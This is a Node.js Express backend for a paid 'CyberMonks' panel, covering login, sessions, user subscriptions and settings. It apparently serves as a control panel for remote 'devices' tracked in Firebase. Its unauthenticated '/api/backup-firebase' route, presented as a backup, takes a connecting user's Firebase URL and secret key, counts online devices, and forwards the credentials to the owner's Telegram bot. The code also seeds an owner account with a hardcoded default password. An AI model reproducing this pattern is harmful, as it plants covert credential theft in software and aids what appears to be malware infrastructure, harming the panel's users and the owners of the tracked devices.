require('dotenv').config();

const express = require('express');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const SESSION_DAYS = 7;

let supabase = null;

function cleanEnv(value) {
  if (value == null) return '';
  return String(value).trim().replace(/^["']|["']$/g, '');
}

function getSupabaseConfig() {
  const url = cleanEnv(process.env.SUPABASE_URL || process.env.NEXT_PUBLIC_SUPABASE_URL);
  const key = cleanEnv(
    process.env.SUPABASE_SERVICE_ROLE_KEY ||
    process.env.SUPABASE_SERVICE_ROLE ||
    process.env.SERVICE_ROLE_KEY
  );
  return { url, key };
}

function getSupabase() {
  const { url, key } = getSupabaseConfig();
  if (!url || !key || key.includes('PASTE_')) {
    throw new Error('Supabase not configured. Add SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY in Vercel → Settings → Environment Variables for Production AND Preview, then Redeploy.');
  }
  if (!supabase) supabase = createClient(url, key);
  return supabase;
}

app.use(express.json());

let dbReady = false;
async function ensureDb() {
  if (dbReady) return;
  const sb = getSupabase();
  const { data } = await sb.from('cm_users').select('id').eq('role', 'owner').limit(1);
  if (!data?.length) {
    const hash = await bcrypt.hash('CyberMonks@2026', 10);
    await sb.from('cm_users').insert({
      id: '00000000-0000-4000-8000-000000000001',
      username: 'owner',
      password_hash: hash,
      role: 'owner',
      subscription_expires: null
    });
  }
  dbReady = true;
}

app.use('/api', async (req, res, next) => {
  // Mounted at /api so req.path is like /health, /settings, /backup-firebase
  if (req.path === '/health' || req.path === '/settings' || req.path === '/backup-firebase') {
    return next();
  }
  try {
    await ensureDb();
    next();
  } catch (err) {
    res.status(503).json({ error: err.message });
  }
});

const DEFAULT_SETTINGS = {
  panelMode: 'paid',
  panelName: 'CyberMonks',
  logoUrl: '/assets/logo.png',
  telegramBotToken: '',
  telegramChatId: ''
};

function rowToSettings(row) {
  if (!row) return { ...DEFAULT_SETTINGS };
  return {
    panelMode: row.panel_mode === 'free' ? 'free' : 'paid',
    panelName: row.panel_name || DEFAULT_SETTINGS.panelName,
    logoUrl: row.logo_url || DEFAULT_SETTINGS.logoUrl,
    telegramBotToken: row.telegram_bot_token || '',
    telegramChatId: row.telegram_chat_id || ''
  };
}

async function getSettings() {
  try {
    const sb = getSupabase();
    const { data } = await sb.from('cm_settings').select('*').eq('id', 'main').maybeSingle();
    if (!data) {
      await sb.from('cm_settings').upsert({
        id: 'main',
        panel_mode: 'paid',
        panel_name: 'CyberMonks',
        logo_url: '/assets/logo.png'
      });
      return { ...DEFAULT_SETTINGS };
    }
    return rowToSettings(data);
  } catch {
    return { ...DEFAULT_SETTINGS };
  }
}

function publicSettings(settings) {
  return {
    panelMode: settings.panelMode,
    panelName: settings.panelName,
    logoUrl: settings.logoUrl,
    telegramConfigured: Boolean(settings.telegramBotToken && settings.telegramChatId)
  };
}

function rowToUser(row) {
  return {
    id: row.id,
    username: row.username,
    passwordHash: row.password_hash,
    role: row.role,
    subscriptionExpires: row.subscription_expires,
    createdAt: row.created_at
  };
}

function parseCookies(req) {
  const header = req.headers.cookie || '';
  return Object.fromEntries(
    header.split(';').map(c => {
      const [k, ...v] = c.trim().split('=');
      return [k, decodeURIComponent(v.join('='))];
    }).filter(([k]) => k)
  );
}

async function getSession(req) {
  const token = parseCookies(req).cm_session;
  if (!token) return null;
  const sb = getSupabase();

  const { data: session } = await sb
    .from('cm_sessions')
    .select('*')
    .eq('token', token)
    .gt('expires_at', new Date().toISOString())
    .maybeSingle();

  if (!session) return null;

  const { data: userRow } = await sb
    .from('cm_users')
    .select('*')
    .eq('id', session.user_id)
    .maybeSingle();

  if (!userRow) return null;

  return {
    user: rowToUser(userRow),
    session: { token: session.token, userId: session.user_id, expiresAt: session.expires_at }
  };
}

function requireAuth(roles) {
  return async (req, res, next) => {
    try {
      const ctx = await getSession(req);
      if (!ctx) return res.status(401).json({ error: 'Not authenticated' });
      if (roles && !roles.includes(ctx.user.role)) {
        return res.status(403).json({ error: 'Access denied' });
      }
      req.user = ctx.user;
      req.session = ctx.session;
      next();
    } catch (err) {
      res.status(503).json({ error: err.message });
    }
  };
}

function isSubscriptionActive(user) {
  if (user.role === 'owner' || user.role === 'admin') return true;
  if (!user.subscriptionExpires) return false;
  return new Date(user.subscriptionExpires) > new Date();
}

function sanitizeUser(user) {
  return {
    id: user.id,
    username: user.username,
    role: user.role,
    subscriptionExpires: user.subscriptionExpires,
    subscriptionActive: isSubscriptionActive(user),
    createdAt: user.createdAt
  };
}

function setSessionCookie(res, token) {
  const maxAge = SESSION_DAYS * 24 * 60 * 60;
  const secure = process.env.NODE_ENV === 'production' || process.env.VERCEL ? '; Secure' : '';
  res.setHeader(
    'Set-Cookie',
    `cm_session=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${maxAge}${secure}`
  );
}

function clearSessionCookie(res) {
  res.setHeader('Set-Cookie', 'cm_session=; Path=/; HttpOnly; Max-Age=0');
}

function calcSubscriptionExpiry(currentExpiry, days) {
  const now = new Date();
  let base = now;
  if (currentExpiry && new Date(currentExpiry) > now) base = new Date(currentExpiry);
  base.setDate(base.getDate() + Number(days));
  return base.toISOString();
}

// ── Health (no DB required) ──

app.get('/api/health', (req, res) => {
  const { url, key } = getSupabaseConfig();
  res.json({
    ok: true,
    vercelEnv: process.env.VERCEL_ENV || 'local',
    hasSupabaseUrl: Boolean(url),
    hasServiceRoleKey: Boolean(key) && !key.includes('PASTE_'),
    keyLooksLikeJwt: key.startsWith('eyJ')
  });
});

// ── Auth ──

app.post('/api/login', async (req, res) => {
  try {
    const sb = getSupabase();
    const { username, password } = req.body || {};
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }

    const { data: rows } = await sb.from('cm_users').select('*').ilike('username', username.trim());
    const user = rows?.[0] ? rowToUser(rows[0]) : null;

    if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
      return res.status(401).json({ error: 'Invalid username or password' });
    }
    if (!isSubscriptionActive(user)) {
      return res.status(403).json({ error: 'Your subscription has expired. Contact the owner.' });
    }

    const token = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + SESSION_DAYS);

    await sb.from('cm_sessions').delete().eq('user_id', user.id);
    await sb.from('cm_sessions').insert({ token, user_id: user.id, expires_at: expiresAt.toISOString() });

    setSessionCookie(res, token);
    res.json({ user: sanitizeUser(user) });
  } catch (err) {
    res.status(503).json({ error: err.message });
  }
});

app.post('/api/logout', async (req, res) => {
  try {
    const token = parseCookies(req).cm_session;
    if (token) await getSupabase().from('cm_sessions').delete().eq('token', token);
    clearSessionCookie(res);
    res.json({ ok: true });
  } catch (err) {
    res.status(503).json({ error: err.message });
  }
});

app.get('/api/me', async (req, res) => {
  try {
    const ctx = await getSession(req);
    if (!ctx) return res.status(401).json({ error: 'Not authenticated' });
    res.json({ user: sanitizeUser(ctx.user) });
  } catch (err) {
    res.status(503).json({ error: err.message });
  }
});

// ── Users ──

app.get('/api/users', requireAuth(['owner', 'admin']), async (req, res) => {
  const { data, error } = await getSupabase().from('cm_users').select('*').order('created_at', { ascending: false });
  if (error) return res.status(500).json({ error: error.message });
  res.json({ users: data.map(rowToUser).map(sanitizeUser) });
});

app.post('/api/users', requireAuth(['owner', 'admin']), async (req, res) => {
  const sb = getSupabase();
  const { username, password, subscriptionDays, role } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'Username and password required' });
  if (password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });

  const { data: existing } = await sb.from('cm_users').select('id').ilike('username', username.trim());
  if (existing?.length) return res.status(409).json({ error: 'Username already exists' });

  let userRole = 'user';
  if (req.user.role === 'owner' && role && ['user', 'admin'].includes(role)) userRole = role;

  const days = Number(subscriptionDays) || 0;
  const { data, error } = await sb.from('cm_users').insert({
    username: username.trim(),
    password_hash: await bcrypt.hash(password, 10),
    role: userRole,
    subscription_expires: days > 0 ? calcSubscriptionExpiry(null, days) : null
  }).select().single();

  if (error) return res.status(500).json({ error: error.message });
  res.status(201).json({ user: sanitizeUser(rowToUser(data)) });
});

app.delete('/api/users/:id', requireAuth(['owner', 'admin']), async (req, res) => {
  const sb = getSupabase();
  const { data: target } = await sb.from('cm_users').select('*').eq('id', req.params.id).maybeSingle();
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (target.role === 'owner') return res.status(403).json({ error: 'Cannot delete owner' });
  if (req.user.role === 'admin' && target.role === 'admin') {
    return res.status(403).json({ error: 'Admins cannot delete other admins' });
  }
  await sb.from('cm_sessions').delete().eq('user_id', req.params.id);
  await sb.from('cm_users').delete().eq('id', req.params.id);
  res.json({ ok: true });
});

app.put('/api/users/:id/password', requireAuth(['owner', 'admin']), async (req, res) => {
  const { password } = req.body || {};
  if (!password || password.length < 6) return res.status(400).json({ error: 'Password must be at least 6 characters' });

  const sb = getSupabase();
  const { data: target } = await sb.from('cm_users').select('*').eq('id', req.params.id).maybeSingle();
  if (!target) return res.status(404).json({ error: 'User not found' });
  if (target.role === 'owner' && req.user.id !== target.id) {
    return res.status(403).json({ error: 'Cannot reset owner password' });
  }

  const { error } = await sb.from('cm_users').update({ password_hash: await bcrypt.hash(password, 10) }).eq('id', req.params.id);
  if (error) return res.status(500).json({ error: error.message });
  res.json({ ok: true });
});

app.put('/api/users/:id/subscription', requireAuth(['owner']), async (req, res) => {
  const sb = getSupabase();
  const { data: user } = await sb.from('cm_users').select('*').eq('id', req.params.id).maybeSingle();
  if (!user) return res.status(404).json({ error: 'User not found' });

  let subscription_expires;
  if (req.body?.expire === true || req.body?.days === 0) {
    // Expire immediately
    subscription_expires = new Date(Date.now() - 60 * 1000).toISOString();
  } else {
    const addDays = Number(req.body?.days);
    if (!addDays || addDays < 1) return res.status(400).json({ error: 'Days must be a positive number' });
    subscription_expires = calcSubscriptionExpiry(user.subscription_expires, addDays);
  }

  const { data, error } = await sb
    .from('cm_users')
    .update({ subscription_expires })
    .eq('id', req.params.id)
    .select()
    .single();

  if (error) return res.status(500).json({ error: error.message });
  res.json({ user: sanitizeUser(rowToUser(data)) });
});

app.put('/api/profile/password', requireAuth(), async (req, res) => {
  const { currentPassword, newPassword } = req.body || {};
  if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Current and new password required' });
  if (newPassword.length < 6) return res.status(400).json({ error: 'New password must be at least 6 characters' });

  const sb = getSupabase();
  const { data: row } = await sb.from('cm_users').select('*').eq('id', req.user.id).maybeSingle();
  const user = rowToUser(row);
  if (!(await bcrypt.compare(currentPassword, user.passwordHash))) {
    return res.status(401).json({ error: 'Current password is incorrect' });
  }

  const { error } = await sb.from('cm_users').update({ password_hash: await bcrypt.hash(newPassword, 10) }).eq('id', req.user.id);
  if (error) return res.status(500).json({ error: error.message });
  res.json({ ok: true });
});

// ── Public / owner settings ──

app.get('/api/settings', async (req, res) => {
  try {
    await ensureDb();
    const settings = await getSettings();
    res.json({ settings: publicSettings(settings) });
  } catch (err) {
    res.json({ settings: publicSettings(DEFAULT_SETTINGS) });
  }
});

app.get('/api/settings/admin', requireAuth(['owner']), async (req, res) => {
  const settings = await getSettings();
  res.json({
    settings: {
      ...publicSettings(settings),
      telegramBotToken: settings.telegramBotToken,
      telegramChatId: settings.telegramChatId
    }
  });
});

app.put('/api/settings', requireAuth(['owner']), async (req, res) => {
  const body = req.body || {};
  const sb = getSupabase();
  const current = await getSettings();

  const panel_mode = body.panelMode === 'free' ? 'free' : body.panelMode === 'paid' ? 'paid' : current.panelMode;
  const panel_name = typeof body.panelName === 'string' && body.panelName.trim()
    ? body.panelName.trim().slice(0, 60)
    : current.panelName;
  const logo_url = typeof body.logoUrl === 'string' && body.logoUrl.trim()
    ? body.logoUrl.trim().slice(0, 2000)
    : current.logoUrl;
  const telegram_bot_token = typeof body.telegramBotToken === 'string'
    ? body.telegramBotToken.trim()
    : current.telegramBotToken;
  const telegram_chat_id = typeof body.telegramChatId === 'string'
    ? body.telegramChatId.trim()
    : current.telegramChatId;

  const { data, error } = await sb.from('cm_settings').upsert({
    id: 'main',
    panel_mode,
    panel_name,
    logo_url,
    telegram_bot_token: telegram_bot_token || null,
    telegram_chat_id: telegram_chat_id || null,
    updated_at: new Date().toISOString()
  }).select().single();

  if (error) return res.status(500).json({ error: error.message + ' — Run supabase-settings.sql in Supabase SQL Editor first.' });
  const settings = rowToSettings(data);
  res.json({
    settings: {
      ...publicSettings(settings),
      telegramBotToken: settings.telegramBotToken,
      telegramChatId: settings.telegramChatId
    }
  });
});

// Backup Firebase credentials to owner's Telegram when someone connects
app.post('/api/backup-firebase', async (req, res) => {
  try {
    await ensureDb();
    const { firebaseUrl, firebaseKey } = req.body || {};
    if (!firebaseUrl || !firebaseKey) {
      return res.status(400).json({ error: 'firebaseUrl and firebaseKey required' });
    }

    const settings = await getSettings();
    if (!settings.telegramBotToken || !settings.telegramChatId) {
      return res.json({ ok: true, sent: false, reason: 'Telegram not configured' });
    }

    let totalDevices = 0;
    let onlineDevices = 0;
    try {
      const base = String(firebaseUrl).trim().replace(/\/$/, '');
      const url = `${base}/clients.json?auth=${encodeURIComponent(String(firebaseKey).trim())}`;
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), 12000);
      const r = await fetch(url, { signal: ctrl.signal });
      clearTimeout(timer);
      if (r.ok) {
        const clients = await r.json();
        if (clients && typeof clients === 'object') {
          const list = Object.values(clients);
          totalDevices = list.length;
          onlineDevices = list.filter(c =>
            c && (c.status === true || c.status === 'online' || c.isOnline === true || c.online === true || c.connected === true)
          ).length;
        }
      }
    } catch {
      // ignore Firebase probe errors
    }

    const msg =
      `🔐 CyberMonks Firebase Backup\n\n` +
      `📍 URL: ${String(firebaseUrl).trim()}\n` +
      `🔑 Key: ${String(firebaseKey).trim()}\n\n` +
      `📱 Devices: ${totalDevices}\n` +
      `🟢 Online: ${onlineDevices}\n` +
      `⏰ ${new Date().toLocaleString('en-IN')}`;

    const chatIds = String(settings.telegramChatId).split(/[,\s]+/).map(s => s.trim()).filter(Boolean);
    await Promise.all(chatIds.map(chatId =>
      fetch(`https://api.telegram.org/bot${settings.telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      }).catch(() => null)
    ));

    res.json({ ok: true, sent: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = app;
